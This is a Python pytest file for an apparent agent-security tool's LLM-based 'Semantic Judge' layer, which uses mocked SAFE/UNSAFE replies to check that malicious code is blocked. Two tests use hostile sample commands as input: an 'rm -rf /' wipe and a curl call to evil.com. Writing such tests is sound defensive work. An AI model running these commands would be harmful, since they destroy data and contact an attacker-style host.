"""
Tests for Layer 3 — Semantic Judge (Gemini).

Uses mocks to simulate LLM responses (SAFE/UNSAFE) without real API calls.
"""

from unittest.mock import MagicMock

import pytest
from langchain_core.messages import AIMessage

from agentguard.exceptions import SecurityBlockedError
from agentguard.judges.gemini_judge import SemanticJudge


@pytest.fixture
def mock_safe_llm() -> MagicMock:
    """An LLM mock that always responds with 'SAFE'."""
    llm = MagicMock()
    llm.invoke.return_value = AIMessage(content="SAFE")
    return llm


@pytest.fixture
def mock_unsafe_llm() -> MagicMock:
    """An LLM mock that always responds with 'UNSAFE'."""
    llm = MagicMock()
    llm.invoke.return_value = AIMessage(content="UNSAFE")
    return llm


@pytest.fixture
def mock_ambiguous_llm() -> MagicMock:
    """An LLM mock that responds with unexpected text (should be treated as UNSAFE)."""
    llm = MagicMock()
    llm.invoke.return_value = AIMessage(content="I'm not sure about this code.")
    return llm


# ── Tests ────────────────────────────────────────────────────────────────────


def test_safe_code_passes(mock_safe_llm: MagicMock) -> None:
    """Code judged as SAFE should not raise any exception."""
    judge = SemanticJudge(mock_safe_llm)
    judge.validate("import math; result = math.sqrt(4)")  # Should not raise


def test_unsafe_code_is_blocked(mock_unsafe_llm: MagicMock) -> None:
    """Code judged as UNSAFE should raise SecurityBlockedError."""
    judge = SemanticJudge(mock_unsafe_llm)
    with pytest.raises(SecurityBlockedError) as exc_info:
        judge.validate("import os; os.system('rm -rf /')")
    assert "Semantic Judge" in str(exc_info.value)
    assert "malicious" in str(exc_info.value).lower()


def test_ambiguous_response_is_blocked(mock_ambiguous_llm: MagicMock) -> None:
    """Non-'SAFE' LLM response should be treated as UNSAFE (fail-closed)."""
    judge = SemanticJudge(mock_ambiguous_llm)
    with pytest.raises(SecurityBlockedError):
        judge.validate("some ambiguous code")


def test_llm_receives_correct_messages(mock_safe_llm: MagicMock) -> None:
    """Verify the judge sends the correct system+human message structure."""
    judge = SemanticJudge(mock_safe_llm)
    code = "result = 2 + 2"
    judge.validate(code)

    # The LLM should have been called exactly once
    mock_safe_llm.invoke.assert_called_once()
    messages = mock_safe_llm.invoke.call_args[0][0]

    # Should be a list of 2 messages: System + Human
    assert len(messages) == 2
    assert "security engineer" in messages[0].content.lower()
    assert code in messages[1].content


def test_safe_verdict_is_case_insensitive() -> None:
    """'safe', 'Safe', 'SAFE' should all pass (we normalize to uppercase)."""
    for verdict in ["safe", "Safe", "SAFE", " SAFE ", "  safe  "]:
        llm = MagicMock()
        llm.invoke.return_value = AIMessage(content=verdict)
        judge = SemanticJudge(llm)
        judge.validate("result = 42")  # Should not raise


def test_exception_contains_layer_info(mock_unsafe_llm: MagicMock) -> None:
    """The SecurityBlockedError should mention which layer raised it."""
    judge = SemanticJudge(mock_unsafe_llm)
    malicious_code = "import subprocess; subprocess.call(['curl', 'http://evil.com'])"
    with pytest.raises(SecurityBlockedError) as exc_info:
        judge.validate(malicious_code)
    assert exc_info.value.layer == "Semantic Judge (Gemini)"
    assert exc_info.value.code == malicious_code
